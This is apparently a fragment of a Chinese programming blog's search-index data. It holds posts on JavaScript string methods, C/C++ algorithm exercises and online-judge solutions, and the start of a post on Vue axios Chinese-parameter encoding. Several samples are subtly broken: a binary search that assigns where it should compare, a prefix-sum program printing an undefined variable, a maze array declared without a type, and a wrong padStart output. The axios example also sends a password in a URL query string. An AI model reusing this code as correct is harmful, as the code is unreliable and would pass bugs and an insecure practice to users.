start，则在字符串中的指定位置开始从前向后搜索。 lastIndexOf() 方法可返回某个指定的字符串值最后出现的位置，即从后向前搜索。如果指定第二个参数 start，则在字符串中的指定位置从后向前搜索。 需求场景： 关键字首次或最后一次出现的位置 用法1： string.indexOf(searchvalue,start) 指定的字符串值首次出现的位置 用法2： string.lastIndexOf(searchvalue,start) 指定的字符串值最后出现的位置 例子： let str &#x3D; &quot;你来人间一趟，你要看看太阳。和你的心上人一起走在街上，了解她，也要了解太阳&quot; let result1 &#x3D; str.indexOf(&quot;太阳&quot;) let result2 &#x3D; str.indexOf(&quot;太阳&quot;,10) &#x2F;&#x2F; 从10下标的字符开始查找&quot;太阳&quot;，查找范围是&quot;太阳。和你的心上人一起走在街上，了解她，也要了解太阳&quot;，下标还是相对原字符串而言的，因此返回11。 let result3 &#x3D; str.lastIndexOf(&quot;太阳&quot;) let result4 &#x3D; str.lastIndexOf(&quot;太阳&quot;,10) &#x2F;&#x2F; 0-10下标的字符串为&quot;你来人间一趟，你要看看&quot;，没有&quot;太阳&quot;，返回-1 console.log(result1) &#x2F;&#x2F; 控制台打印：11 console.log(result2) &#x2F;&#x2F; 控制台打印：11 console.log(result3) &#x2F;&#x2F; 控制台打印：35 console.log(result4) &#x2F;&#x2F; 控制台打印：-1 复制代码 11. 字符串转大小写 —— toLowerCase() 和 toUpperCase()说明： 字符串大小写之间的转换 需求场景： 网址，英文名，首字母大写等要求。 用法1： string.toLowerCase() 转成小写字母 用法2： string.toUpperCase() 转成大写字母 例子： let str &#x3D; &quot;For you, A thousand times over&quot; let result1 &#x3D; str.toLowerCase() let result2 &#x3D; str.toUpperCase() console.log(result1) &#x2F;&#x2F; 控制台打印：&quot;for you, a thousand times over&quot; console.log(result2) &#x2F;&#x2F; 控制台打印：&quot;FOR YOU, A THOUSAND TIMES OVER&quot; 复制代码 12. 字符串填充到指定长度 —— padStart () 和 padEnd ()说明： 字符串填充指定字符到指定长度 需求场景： 字符串长度不足，需要补充至指定长度n，如年月日，隐藏手机号，隐藏昵称等。 用法1： string.padStart(n,&#39;补充内容&#39;) 从字符串前添加补充内容。 用法2： string.padEnd (n,&#39;补充内容&#39;) 从字符串后添加补充内容。 例子： &#x2F;&#x2F; 在字符串前补充&quot;-&quot;，直到字符串的长度为5 let str1 &#x3D; &#39;预备开始&#39; let result &#x3D; str1.padStart(5, &#39;-&#39;) console.log(result) &#x2F;&#x2F; 控制台打印：&quot;---预备开始&quot; &#x2F;&#x2F;在末尾添加&quot;*&quot;，直到字符串的长度为11 let str2 &#x3D; &quot;184&quot; let result &#x3D; str2.padEnd(11, &quot;*&quot;) console.log(result) &#x2F;&#x2F; 控制台打印：&quot;184********&quot; 复制代码 13. 字符串是否以特定字符（串）开头或结尾 —— startsWith()、endsWith()说明： 用于检测字符串是否以指定的子字符串开始。如果是以指定的子字符串开头返回 true，否则 false。startsWith()、endsWith()方法区分大小写。第二个参数代表从某下标处开始判断是否以特定字符（串）开头或结尾，忽略则startsWith()从下标0开始检测，endsWith()从字符串最后一位下标开始检测。 值得注意的是： 当startsWith() 的第二个参数如果超出了当前字符串的最大长度，依旧生效，返回false。 当endsWith() 的第二个参数如果超出了当前字符串的最大长度，会不生效，改为从字符串最后一位下标开始检测。 需求场景： 判断字符串是否以指定字符开头或结尾 用法1： string.startsWith(searchvalue, start) 用法2： string.endsWith(searchvalue, start) 例子： let str &#x3D; &quot;过去的时候，我们相视一笑，就已过了大半辈子&quot; let result1 &#x3D; str.startsWith(&quot;过去&quot;) let result2 &#x3D; str.startsWith(&quot;过去&quot;,10) let result3 &#x3D; str.endsWith(&quot;半辈子&quot;) let result4 &#x3D; str.endsWith(&quot;半辈子&quot;,20) console.log(result1); &#x2F;&#x2F; 控制台打印：true console.log(result2); &#x2F;&#x2F; 控制台打印：false console.log(result3); &#x2F;&#x2F; 控制台打印：true console.log(result4); &#x2F;&#x2F; 控制台打印：false 复制代码 14. 字符串长度计算 —— length说明： length属性不仅是数组的属性，同时伪数组，字符串都有length属性。但是遇到某些生僻字如“𩸽”或者表情符号“🙂”，它们的length为2，这时候返回的length可能不是我们真正想要的。这是因为js字符串是由16位的代码单元组成，而不是由Unicode代码点组成。同时js使用两个代码单元表示216及其以上的Unicode代码点。这两个代码单元被称为代理对。一个代码单元被默认为1个长度单位，像“𩸽”或者“🙂”是由两个代码单元组成的代理对，因此它们的length为2。 需求场景： 求出当前字符串长度 用法： string.length 例子： let str &#x3D; &quot;相约白头偕老，你却悄悄秃了头&quot; let result &#x3D; str.length console.log(result) &#x2F;&#x2F; 控制台打印：14 复制代码 15. 字符串截取 —— substr() 和 slice() 和 substring()说明： 字符串截取和拼接是字符串最常用也是最易错的方法。主要原因是 substr() 、 slice() 和 substring()的区别有很多小伙伴还不太明白。 substr()： 参数一（必须）：一个整数，要开始截取字符的下标，如为负则代表从尾部开始截取。参数二（可选）：一个整数，要截取字符的数量。如果省略该参数，则默认为string.length，即当前字符串的长度。 slice() ： 参数一（必须）：一个整数，要开始截取字符的下标，如为负则代表从尾部开始截取。参数二（可选）：一个整数，要结束截取字符的下标，如为负则代表从尾部截取多少个字符。如果省略该参数，则默认为string.length，即当前字符串的长度。 substring() ： 参数一（必须）：一个非负的整数，要开始截取字符的下标。参数二（可选）：一个非负的整数，要结束截取字符的下标。如果省略该参数，则默认为string.length，即当前字符串的长度。 需求场景： 截取指定下标指定长度的字符串 用法1： string.substr(start,length) 用法2： string.slice(start,end) 用法3： string.substring(start,end) 例子： let str &#x3D; &#39;0123456789&#39; let result1 &#x3D; str.substr(2,5) &#x2F;&#x2F; 从下标2开始截取，截取5位 let result2 &#x3D; str.slice(2,5) &#x2F;&#x2F; 从下标2开始截取，截取到下标5（不含下标5） let result3 &#x3D; str.substring(2,5) &#x2F;&#x2F; 从下标2开始截取，截取到下标5（不含下标5） console.log(result1) &#x2F;&#x2F; 控制台打印：23456 console.log(result2) &#x2F;&#x2F; 控制台打印：234 console.log(result3) &#x2F;&#x2F; 控制台打印：234 复制代码 总结这就是关于字符串常用的15个方法详细说明，可在我们工作中的很多时候，可能并不能很好的使用它们。大多是因为不够熟练，看一遍容易忘记，所以我们要时常翻一翻这些常用的方法，也许就能节省你工作中几十分钟~ 为摸鱼大业添砖加瓦 ~ 转自：《看完就懂系列》15个方法教你玩转字符串"},{"title":"","path":"/post/2841.html","text":"输入未知长度字符数组#include &lt;stdio.h&gt; int main() &#123; char array_num[100] ; int i &#x3D; 0, length; do &#123; scanf(&quot;%c&quot;, &amp;array_num[i]); i++; &#125; while (array_num[i - 1] !&#x3D; &#39;\\n&#39;); length &#x3D; i-1; for (i &#x3D; 0; i &lt; length; i++) printf(&quot;%c&quot;, array_num[i]); getchar();&#x2F;&#x2F;VS2017中特殊设置，解决CMD窗口闪退问题 return 0; &#125; 冒泡排序#include &lt;stdio.h&gt; void fun1(int num[], int length); int main() &#123; int a[1001]; int k, i, j; scanf(&quot;%d&quot;, &amp;k); for (i &#x3D; 0; i &lt; k; i++) &#123; scanf(&quot;%d&quot;, &amp;a[i]); &#125; fun1(a, k); for (i &#x3D; 0; i &lt; k; i++) &#123; printf(&quot;%d &quot;, a[i]); &#125; &#125; void fun1(int num[], int length) &#123; int i, j; for (i &#x3D; 0; i &lt; length - 1; ++i) &#123; for (j &#x3D; 0; j &lt; length - i - 1; ++j) &#123; if (num[j] &gt; num[j + 1]) &#123; int t; t &#x3D; num[j]; num[j] &#x3D; num[j + 1]; num[j + 1] &#x3D; t; &#125; &#125; &#125; &#125; 折半查找#include &lt;stdio.h&gt; void fun1(int num[], int length); int fun2(int num[], int length, int x); int main() &#123; int a[1001]; int k, i, j; scanf(&quot;%d&quot;, &amp;k); for (i &#x3D; 0; i &lt; k; i++) &#123; scanf(&quot;%d&quot;, &amp;a[i]); &#125; fun1(a, k); for (i &#x3D; 0; i &lt; k; i++) &#123; if (i &#x3D;&#x3D; 0) &#123; printf(&quot;%d&quot;, a[i]); &#125; else &#123; printf(&quot; %d&quot;, a[i]); &#125; &#125; printf(&quot;\\n&quot;); int flag &#x3D; fun2(a, k, 4); printf(&quot;%d\\n&quot;, flag); &#125; void fun1(int num[], int length) &#123; int i, j; for (i &#x3D; 0; i &lt; length - 1; ++i) &#123; for (j &#x3D; 0; j &lt; length - i - 1; ++j) &#123; if (num[j] &gt; num[j + 1]) &#123; int t; t &#x3D; num[j]; num[j] &#x3D; num[j + 1]; num[j + 1] &#x3D; t; &#125; &#125; &#125; &#125; int fun2(int num[], int length, int x) &#123; int low &#x3D; 0; int high &#x3D; length - 1; while (low &lt; high) &#123; int mid &#x3D; (high + low) &#x2F; 2; if (x &#x3D; num[mid]) &#123; return mid; &#125; else if (num[mid] &gt; x) &#123; high &#x3D; mid - 1; &#125; else &#123; low &#x3D; mid+1;; &#125; &#125; return 0; &#125; 桶排序#include&lt;stdio.h&gt; #include&lt;string.h&gt; int main() &#123; char str[100]; int book[100] &#x3D; &#123; 0 &#125;; while (scanf(&quot;%s&quot;, str) !&#x3D; EOF) &#123; int len &#x3D; strlen(str); for (int i &#x3D; 0; i &lt; len; i++) &#123; book[str[i]]++; &#125; for (int i &#x3D; 0; i &lt; 95; i++) &#123; if (book[i] !&#x3D; 0) &#123; printf(&quot;%c&quot;, i); &#125; &#125; printf(&quot;\\n&quot;); &#125; return 0; &#125; 快速排序#include&lt;stdio.h&gt; int num[100]; int n; void quicksort(int left, int right) &#123; int i, j,t, temp; if (left &gt; right) &#123; return; &#125; temp &#x3D; num[left]; i &#x3D; left; j &#x3D; right; while (i !&#x3D; j) &#123; while (num[j] &gt;&#x3D; temp &amp;&amp; j &gt; i) &#123; j--; &#125; while (num[i] &lt;&#x3D; temp &amp;&amp; i &lt; j) &#123; i++; &#125; if (i &lt; j) &#123; t &#x3D; num[i]; num[i] &#x3D; num[j]; num[j] &#x3D; t; &#125; &#125; num[left] &#x3D; num[i]; num[i] &#x3D; temp; quicksort(left, i - 1); quicksort(i + 1, right); return; &#125; int main() &#123; scanf(&quot;%d&quot;, &amp; n); int i; for (i &#x3D; 0; i &lt; n; i++) &#123; scanf(&quot;%d&quot;, &amp;num[i]); &#125; quicksort(0, n-1); for (i &#x3D; 0; i &lt; n; i++) &#123; if (i &#x3D;&#x3D; 0) &#123; printf(&quot;%d&quot;, num[0]); &#125; else &#123; printf(&quot; %d&quot;, num[i]); &#125; &#125; printf(&quot;\\n&quot;); return 0; &#125; 埃氏筛法#include &lt;stdio.h&gt; int fun(int n); int main() &#123; int n; scanf(&quot;%d&quot;, &amp;n); int k; k &#x3D; fun(n); printf(&quot;%d\\n&quot;, k); return 0; &#125; int fun(int n) &#123; int count &#x3D; 0; int num[n + 1]; int i; num[0] &#x3D; 0; num[1] &#x3D; 0; for (i &#x3D; 2; i &lt; n; i++) &#123; num[i] &#x3D; 1; &#125; int j; for (j &#x3D; 2; j &lt;&#x3D; n; j++) &#123; if (num[j] &#x3D;&#x3D; 1) &#123; count++; int x; for (x &#x3D; 2 * j; x &lt;&#x3D; n; x &#x3D; x + j) &#123; num[x] &#x3D; 0; &#125; &#125; &#125; return count; &#125; 队列结构体 解密：一串字符，第1个数删除，第2个数放到最后；第3个数删除，第4个数放到最后.。。。。 例如：631758924加密后为615947283 #include&lt;stdio.h> struct queue &#123; int data[100]; int head; int tail; &#125;; int main() &#123; int n; struct queue q; scanf(\"%d\", &amp;n); int i; for (i = 0; i &lt; n; i++) &#123; scanf(\"%d\", &amp;q.data[i]); &#125; q.head = 0; q.tail = n; while (q.head &lt; q.tail) &#123; printf(\"%d \", q.data[q.head]); q.data[q.tail] = q.data[q.head + 1]; q.tail++; q.head += 2; &#125; printf(\"\\n\"); return 0; &#125; 栈判断回文串 #include&lt;stdio.h> #include&lt;string.h> int main() &#123; int len; char s[101]; gets(s); len = strlen(s); int mid = len / 2-1; /// &lt;summary> /// 左边压栈 /// &lt;/summary> /// &lt;returns>&lt;/returns> char str[101]; int top = 0; int i; for (i = 0;i &lt;= mid; i++) &#123; str[++top] = s[i]; &#125; /// &lt;summary> /// 判断 /// &lt;/summary> /// &lt;returns>&lt;/returns> int next=0; if (len % 2 == 0) &#123; next = mid + 1; &#125; else &#123; next = mid + 2; &#125; for (i = next; i &lt; len; i++) &#123; if (s[i] != str[top]) &#123; break; &#125; top--; &#125; if (top == 0) &#123; printf(\"Yes\\n\"); &#125; else &#123; printf(\"No\\n\"); &#125; return 0; &#125; 深度优先1-10中选数字，使得a’b’c+def&#x3D;hij;不能重复选void dfs(int step) &#123; 判断边界 尝试每一中可能for(i&#x3D;0;i&lt;&#x3D;n;i++) &#123; 继续下一步dfs(step+1) &#125; 返回 &#125; #include&lt;stdio.h> int a[10],book[10]; int sum=0; void dfs(int step) &#123; int i; if(step==10) &#123; if(a[1]*100+a[2]*10+a[3]+a[4]*100+a[5]*10+a[6]==a[7]*100+a[8]*10+a[9]) &#123; sum++; printf(\"%d%d%d+%d%d%d=%d%d%d\\n\",a[1],a[2],a[3],a[4],a[5],a[6],a[7],a[8],a[9]); &#125; return; &#125; for(i=1;i&lt;=9;i++) &#123; if(book[i]==0) &#123; a[step]=i; book[i]=1; dfs(step+1); book[i]=0; &#125; &#125; return; &#125; int main() &#123; dfs(1); printf(\"Total ： %d\\n\",sum/2); return 0; &#125; 迷宫n行m列，0表示可走，1表示障碍，从（startx，starty）到（p，q)，找最短路径 #include&lt;stdio.h> int min=999; int a[51][51]; book[51][51]; int n,m; int p,q; int next[4][2]=&#123; &#123;1,0&#125;, &#123;0,1&#125;, &#123;-1,0&#125;, &#123;0,-1&#125; &#125;; void dfs(int x,int y,int step) &#123; if(x==p&amp;&amp;y==q) &#123; if(step&lt;min) &#123; min=step; &#125; return; &#125; int i=0; for(i=0;i&lt;4;i++) &#123; int tx = x+next[i][0]; int ty = y+next[i][1]; if(tx>=0&amp;&amp;tx&lt;n&amp;&amp;ty>=0&amp;&amp;ty&lt;m) &#123; if(book[tx][ty]==0&amp;&amp;a[tx][ty]==0) &#123; book[tx][ty]=1; dfs(tx,ty,step+1); book[tx][ty]=0; &#125; &#125; &#125; return; &#125; int main() &#123; scanf(\"%d %d\",&amp;n,&amp;m); int i,j; for(i=0;i&lt;n;i++) &#123; for(j=0;j&lt;m;j++) &#123; scanf(\"%d\",&amp;a[i][j]); &#125; &#125; int startx,starty; scanf(\"%d %d %d %d\",&amp;startx,&amp;starty,&amp;p,&amp;q); book[startx][starty]=1; dfs(startx,starty,0); printf(\"%d\\n\",min); return 0; &#125; 样例输入 5 4 0 0 1 0 0 0 0 0 0 0 1 0 0 1 0 0 0 0 0 1 0 0 3 2 样例输出 7 广度优先迷宫n行m列，0表示可走，1表示障碍，从（startx，starty）到（p，q)，找最短路径 #include&lt;stdio.h> struct note&#123; int x; // 横坐标 int y; // 纵坐标 int s; // 步数 &#125;; int main() &#123; struct note que[2501]; int a[51][51]; int book[51][51]=&#123;0&#125;; int next[4][2]=&#123; &#123;0,1&#125;, &#123;1,0&#125;, &#123;0,-1&#125;, &#123;-1,0&#125; &#125;; int head,tail; int n,m; int i,j; int startx,starty,p,q; scanf(\"%d %d\",&amp;n,&amp;m); for(i=1;i&lt;=n;i++) &#123; for(j=1;j&lt;=m;j++) &#123; scanf(\"%d\",&amp;a[i][j]); &#125; &#125; scanf(\"%d %d %d %d\",&amp;startx,&amp;starty,&amp;p,&amp;q); head=1; tail=1; que[tail].x=startx; que[tail].y=starty; que[tail].s=0; tail++; book[startx][starty]=1; int k,tx,ty; int flag=0; while(head&lt;tail) &#123; for(k=0;k&lt;4;k++) &#123; tx=que[head].x+next[k][0]; ty=que[head].y+next[k][1]; if(tx>0&amp;&amp;tx&lt;=n&amp;&amp;ty>0&amp;&amp;ty&lt;=m) &#123; if(a[tx][ty]==0&amp;&amp;book[tx][ty]==0) &#123; book[tx][ty]=1; que[tail].x=tx; que[tail].y=ty; que[tail].s=que[head].s+1; tail++; &#125; &#125; if(tx==p&amp;&amp;ty==q) &#123; flag=1; break; &#125; &#125; if(flag==1) &#123; break; &#125; head++; &#125; printf(\"%d\\n\",que[tail-1].s); return 0; &#125; 样例输入 5 4 0 0 1 0 0 0 0 0 0 0 1 0 0 1 0 0 0 0 0 1 0 0 3 2 样例输出 7 不要输出多余的零%g 数据类型 定义一个未知行数和列数的二维数组#include &lt;stdio.h&gt; int main() &#123; int n; scanf(&quot;%d&quot;,&amp;n); int **num &#x3D; (int**)malloc(sizeof(int*)*n); int i; for(i&#x3D;0;i&lt;n;i++)&#123; num[i]&#x3D;(int*)malloc(sizeof(int)*n); &#125; int j; for(i&#x3D;0;i&lt;n;i++)&#123; for(j&#x3D;0;j&lt;n;j++)&#123; scanf(&quot;%d&quot;,&amp;num[i][j]); &#125; &#125; return 0; &#125; 前缀和前缀和是指某序列的前n项和，可以把它理解为数学上的数列的前n项和，而差分可以看成前缀和的逆运算。合理的使用前缀和与差分，可以将某些复杂的问题简单化。 一维前缀和输入一个长度为n的整数序列。接下来再输入m个询问，每个询问输入一对l, r。对于每个询问，输出原序列中从第l个数到第r个数的和。 我们很容易想出暴力解法，遍历区间求和。 代码如下： int n,m; scanf(&quot;%d%d&quot;,&amp;n,&amp;m); for(int i&#x3D;1;i&lt;&#x3D;n;i++) scanf(&quot;%d&quot;,&amp;a[i]); while(m--) &#123; int l,r; int sum&#x3D;0; scanf(&quot;%d%d&quot;,&amp;l,&amp;r); for(int i&#x3D;l;i&lt;&#x3D;r;i++) &#123; sum+&#x3D;a[i]; &#125; printf(&quot;%d\\n&quot;,sum); &#125; 这样的时间复杂度为O(n*m)，如果n和m的数据量稍微大一点就有可能超时，而我们如果使用前缀和的方法来做的话就能够将时间复杂度降到O(n+m),大大提高了运算效率。 具体做法： 首先做一个预处理，定义一个sum[]数组，sum[i]代表a数组中前i个数的和。 求前缀和运算： const int N&#x3D;1e5+10; int sum[N],a[N]; &#x2F;&#x2F;sum[i]&#x3D;a[1]+a[2]+a[3].....a[i]; for(int i&#x3D;1;i&lt;&#x3D;n;i++) &#123; sum[i]&#x3D;sum[i-1]+a[i]; &#125; 然后查询操作： scanf(&quot;%d%d&quot;,&amp;l,&amp;r); printf(&quot;%d\\n&quot;, sum[r]-sum[l-1]); 对于每次查询，只需执行sum[r]-sum[l-1] ，时间复杂度为O(1) 原理 sum[r] &#x3D;a[1]+a[2]+a[3]+a[l-1]+a[l]+a[l+1]……a[r];sum[l-1]&#x3D;a[1]+a[2]+a[3]+a[l-1];sum[r]-sum[l-1]&#x3D;a[l]+a[l+1]+……+a[r]; 二维前缀和 知道了两个点的位置和他们的二维前缀和图中红色是左上角的那个点的二维前缀和红色+黄色部分是右下角的那个点的二维前缀和是不是可以用这个来求出他们之间的矩阵的和呢？也就是这一部分： D - B - C + A #include&lt;iostream&gt; #include&lt;cstdio&gt; #define int long long using namespace std; const int Max &#x3D; 1003; int a[Max][Max]; int f[Max][Max]; signed main() &#123; freopen(&quot;acioi.in&quot;,&quot;r&quot;,stdin); int n,m,c; cin &gt;&gt; n &gt;&gt; m &gt;&gt; c; for(register int i &#x3D; 1;i &lt;&#x3D; n;++ i) for(register int j &#x3D; 1;j &lt;&#x3D; m;++ j) cin &gt;&gt; a[i][j],f[i][j] &#x3D; f[i - 1][j] + f[i][j - 1] - f[i - 1][j - 1] + a[i][j]; int k; cin &gt;&gt; k; for(register int i &#x3D; 1;i &lt;&#x3D; k;++ i) &#123; int x1,x2,y1,y2;&#x2F;&#x2F;x1,y1是左上角的坐标，另一对是右下角的坐标 cin &gt;&gt; x1 &gt;&gt; y1 &gt;&gt; x2 &gt;&gt; y2; cout &lt;&lt; f[x2][y2] - f[x1 - 1][y2] - f[x2][y1 - 1] + f[x1 - 1][y1 - 1]; &#125; cout &lt;&lt; M &lt;&lt; endl; return 0; &#125; 2021计设2021年程序设计实践练习11123： duoxida的数字游戏 [ Submit Code ] [ Top 20 Runs ] [ Runs Status ] Acceteped : 892 Submit : 2072 Time Limit : 1000 MS Memory Limit : 65536 KB Description 题目描述duoxida很喜欢玩数字游戏，某天无聊的时候，他决定一个人玩数字游戏。他黑板上写下了一行总共有n个数，然后对其重复进行一个操作: 找到从左到右第k个的数x，在数字序列的最右边增加一个x，删除最左边的第一个数字。 duoxida很想知道知道多少次操作后，这个序列就变得完全一样。输入数据的第一行为一个整数t,1&lt;&#x3D;t&lt;&#x3D;10，表示测试用例的个数。每组样例的第一行是n，k,(1≤k≤n≤1000)。 接下来一行有n个整数。输出每个用例输出一行，即操作次数，如果这个序列无法变得完全一样，输出”-1”。样例输入2 3 2 3 1 1 3 1 3 1 1 样例输出1 -1 #include&lt;stdio.h> int main() &#123; int t; scanf(\"%d\", &amp;t); while (t--) &#123; int n, k; scanf(\"%d %d\", &amp;n, &amp;k); int x[1001]; for (int i = 0; i &lt; n; i++) &#123; scanf(\"%d\", &amp;x[i]); &#125; int flag = 1; int a = x[k - 1]; for (int i = k; i &lt; n; i++) &#123; if (a != x[i]) &#123; flag = 0; break; &#125; &#125; if (flag == 0) printf(\"-1\\n\"); else &#123; int sum = 0; for (int i = k - 2; i > 0; i--) &#123; if (x[i] == a) &#123; sum++; &#125; else break; &#125; printf(\"%d\\n\", k - 1 - sum); &#125; &#125; return 0; &#125; 1127： 数列 [ Submit Code ] [ Top 20 Runs ] [ Runs Status ] Acceteped : 567 Time Limit : 3000 MS Description 题目描述数列生成规则如下：第一项的值为a,第二项的值为b, (0 ≤ a,b ≤ 9)前两项之积，如果为一位数，则为本项的值；如果为两位数，则十位为本项，个位为后一项。比如a&#x3D;2,b&#x3D;3,那么数列为2,3,6,1,8,8,…。 请写一个程序，输出数列的第n个元素的值。输入第一行是一个整数K，表示样例的个数。 每个样例的第一行是三个整数a,b,Q(1 ≤ Q ≤ 1,000),其中Q表示查询的次数。 以后的Q行，每行一个整数n,(1 ≤ n ≤ 1,000,000,000)。输出每个样例的每个查询输出一行，即对应元素的值。样例输入3 2 3 4 1 2 3 4 3 3 4 1 2 3 4 9 9 1 100000000 样例输出2 3 6 1 3 3 9 2 2 #include &lt;stdio.h> #include &lt;stdlib.h> void shulie(int b, int c, int m) &#123; int x[1001]=&#123;0&#125;; x[0]=b;x[1]=c; int i,o,n,p; for(i=2;i&lt;108;i++) &#123; n=x[i-1]*x[i-2]; if(n&lt;10) x[i]=n; else &#123; x[i]=n/10; x[i+1]=n%10; i++; &#125; &#125; for(i=0;i&lt;m;i++) &#123; scanf(\"%d\",&amp;o); if(o&lt;108) printf(\"%d\\n\",x[o-1]); else&#123; p=(o-108)%8+100; printf(\"%d\\n\",x[p-1]); &#125; &#125; &#125; int main() &#123; int k, a, b, q, n, i; scanf(\"%d\", &amp;k); while (k--) &#123; scanf(\"%d%d%d\", &amp;a, &amp;b, &amp;q); shulie(a, b, q); &#125; return 0; &#125; 1163： ASCII [ Submit Code ] [ Top 20 Runs ] [ Runs Status ] Acceteped : 1654 Submit : 5058 Time Limit : 1000 MS Memory Limit : 65536 KB Description 题目描述给你一段ASCII编码的文字，输出其每个字符的ASCII码。输入一段文字，由ASCII码字符组成。输出先输出行号，行号为16进制，占5位，从0开始计数，行号前导为0，然后空一格。 每行最多输出32个字符的ASCII码，每个ASCII码为16进制，占2位，前导为0，中间用空格隔开。 所有16进制使用大写AF表示1015。最后一行行末无空格，无换行。样例输入ACM International Collegiate Programming Contest, I LOVE YOU Lotus is a mystic symbol. 样例输出00000 41 43 4D 20 49 6E 74 65 72 6E 61 74 69 6F 6E 61 00001 6C 20 43 6F 6C 6C 65 67 69 61 74 65 20 50 72 6F 00002 67 72 61 6D 6D 69 6E 67 20 43 6F 6E 74 65 73 74 00003 2C 0A 49 20 4C 4F 56 45 20 59 4F 55 0A 4C 6F 74 00004 75 73 20 69 73 20 61 20 6D 79 73 74 69 63 20 73 00005 79 6D 62 6F 6C 2E 20 0A #include&lt;stdio.h> int main() &#123; char s[100000]; char c; int a = 0; while((c=getchar()) != EOF) &#123; s[a++] = c; &#125; int lineCnt; int line = 0; if(a % 16 == 0) &#123; lineCnt = a / 16; &#125; else &#123; lineCnt = a / 16 + 1; &#125; for(int i = 0; i &lt; lineCnt - 1; i++) &#123; printf(\"%05X \", line++); for(int j = 0; j &lt; 15; j++) &#123; printf(\"%02X \", s[i*16+j]); &#125; printf(\"%02X\", s[i*16+15]); printf(\"\\n\"); &#125; printf(\"%05X \", line++); for(int j = 0; j &lt; a%16 - 1; j++) &#123; printf(\"%02X \", s[(lineCnt-1)*16+j]); &#125; printf(\"%02X\", s[(lineCnt-1)*16+a%16-1]); return 0; &#125; 1170： ICPC [ Submit Code ] [ Top 20 Runs ] [ Runs Status ] Acceteped : 1009 Submit : 2432 Time Limit : 1000 MS Memory Limit : 65536 KB Description 题目描述ACM&#x2F;ICPC比赛涉及的知识点非常多，一个队伍三个人需要能够互补。一个队伍某个知识点的高度是三个人中水平最高的那个人决定。现在给你三个人的每个知识点的水平情况，请计算一下这个队伍的水平。输入存在多个样例。每个样例的第一行是一个整数N(3≤N≤100)，表示所有知识点的个数。 以后三行为每个人每个知识点的水平情况。水平用A到E表示，一共5级，A最强，E最弱，依次递减。输出每个样例输出两行，第一行为一个字符串，一个队伍的各个知识点的水平情况。第二行是5个整数，表示5个级别知识点的个数,每个整数之间有一个空格。样例输入3 ABC BBB AAE 4 DDBD DEDC CDDE 0 样例输出AAB 2 1 0 0 0 CDBC 0 1 2 1 0 #include&lt;stdio.h> int main() &#123; int n; while(scanf(\"%d\",&amp;n)) &#123; if(n==0) &#123; return 0; &#125; getchar(); char x[3][100]; int i,j; for(i=0;i&lt;3;i++) &#123; for(j=0;j&lt;n;j++) &#123; scanf(\"%c\",&amp;x[i][j]); &#125; getchar(); &#125; char max[100]; int t=0; for(j=0;j&lt;n;j++)&#123; char max1=x[0][j]; for(i=0;i&lt;3;i++) &#123; if(max1>x[i][j]) &#123; max1=x[i][j]; &#125; &#125; max[t]=max1; t++; &#125; int a=0,b=0,c=0,d=0,e=0; for(i=0;i&lt;t;i++) &#123; printf(\"%c\",max[i]); if(max[i]=='A') &#123; a++; &#125; else if(max[i]=='B') &#123; b++; &#125; else if(max[i]=='C') &#123; c++; &#125; else if(max[i]=='D') &#123; d++; &#125; else &#123; e++; &#125; &#125; printf(\"\\n\"); printf(\"%d %d %d %d %d\\n\",a,b,c,d,e); &#125; return 0; &#125; 1241: Permutation [ Submit Code ] [ Top 20 Runs ] [ Runs Status ] Acceteped : 1179 Submit : 2750 Time Limit : 1000 MS Memory Limit : 65536 KB Description 输入第一行是一个整数K(1≤K≤1000)，表示样例的个数。 每个样例占一行，第一个整数是n(1≤n≤100)，以后的n个整数xi,1≤xi≤n且 xi是唯一的, (1x12x2⋯⋯nxn)表示一个置换。输出输出一个样例的结果。样例输入3 3 1 2 3 3 2 1 3 3 2 3 1 样例输出1 2 3 #include&lt;stdio.h> int gcd(int a,int b) &#123; if(b==0) return a; return gcd(b,a%b); &#125; int main() &#123; int k; scanf(\"%d\",&amp;k); while(k--)&#123; int n; scanf(\"%d\",&amp;n); int num[120]; for(int i = 1 ;i &lt;= n;i++) &#123; scanf(\"%d\",&amp;num[i]); &#125; long long int res = 1; for(int i = 1 ;i &lt;= n;i++)&#123; long long int tmp = 1; int pos = num[i]; while(pos!=i)&#123; tmp++; pos = num[pos]; &#125; res = res * tmp /gcd(res,tmp); &#125; printf(\"%d\\n\",res); &#125; return 0; &#125; 1251: Colombian Number [ Submit Code ] [ Top 20 Runs ] [ Runs Status ] Acceteped : 2630 Submit : 6299 Time Limit : 1000 MS Memory Limit : 65536 KB Description Colombian Number题目描述对于正整数n,不存在整数k,使得n等于k加上k的数码累加和，我们称这样的数是哥伦比亚数或者自我数。 比如 11就不是一个哥伦比亚数，因为10加上10的数码累加和1等于11;而20则是一个哥伦比亚数。输入第一行是一个整数K(K≤10,000)，表示样例的个数。 以后每行一个正整数n(1≤n≤1,000,000,000)输出每行输出一个样例的结果，如果是哥伦比亚数输出”Yes”,否则输出”No”。样例输入5 1 2 3 20 21 样例输出Yes No Yes Yes No #include&lt;stdio.h> int Colnum(int i) &#123; int m = i; while(i != 0) &#123; m += i%10; i /= 10; &#125; return m; &#125; int main() &#123; int t; scanf(\"%d\",&amp;t); while(t--) &#123; int n,i; int flag = 1; scanf(\"%d\",&amp;n); for(i = n-1; i > 0 &amp;&amp; i > n-81; i--) &#123; if(Colnum(i) == n) &#123; flag = 0; break; &#125; &#125; if(flag==1) &#123; printf(\"Yes\\n\"); &#125; else &#123; printf(\"No\\n\"); &#125; &#125; return 0; &#125;"},{"title":"vue axios传中文参数导致乱码的解决方案","path":"/post/33d0.html","text":"问题描述var that &#x3D; this; var name &#x3D; that.signform.signname; var username &#x3D; that.signform.signusername; var password &#x3D; that.signform.signpassword; var user_type &#x3D; that.sign_user_type; var email &#x3D; that.signform.mailAddress; var studentid &#x3D; that.signform.studentid; this.$axios(&#123; method: &quot;post&quot;, url: this.$api + &#96;&#x2F;Register&#x2F;?name&#x3D;$&#123;name&#125;&amp;username&#x3D;$&#123;username&#125;&amp;password&#x3D;$&#123;password&#125;&amp;user_type&#x3D;$&#123;user_type&#125;&amp;email&#x3D;$&#123;email&#125;&amp;studentid&#x3D;$&#123;studentid&#125;&#96;, &#x2F;&#x2F;利用了字符串模板来携带id &#125;) .then((res) &#x3D;&gt; &#123; console.log(res); this.changeCode(); &#125;) .catch((req) &#x3D;&gt; &#123; &#x2F;&#x2F; console.log(req); &#125;); 在vue axios post 请求注册用户时，刚开始通过如上字符拼接形式调用api时，在服务器后端出现了utf-8汉语乱码： 图中name字段本是中文，服务器后端出现了utf-8汉语乱码， 查询bing后有如下几种解决办法： 其中有添加 headers: { ​ “Content-Type”: 